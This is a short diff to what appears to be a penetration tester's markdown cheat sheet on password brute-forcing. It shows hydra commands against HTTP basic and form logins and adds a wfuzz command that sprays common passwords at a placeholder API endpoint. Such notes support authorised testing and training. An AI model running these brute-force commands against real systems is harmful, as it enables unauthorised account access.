@@ -21,6 +21,9 @@ hydra -I -V -C creds.txt -t 1 "http-get://<IP>:<PORT>/svn:A=BASIC:F=401"
 
 # username and password encoded
 hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://<url>:username=^USER64^&password=^PASS64^:C=/:F=403'
+
+# API Key
+wfuzz -z list,user1-yuser2-user3 -z file,/usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt --basic FUZZ:FUZ2Z http://<domain>/api/v1/user > output.txt
 ```
 
 wordlists
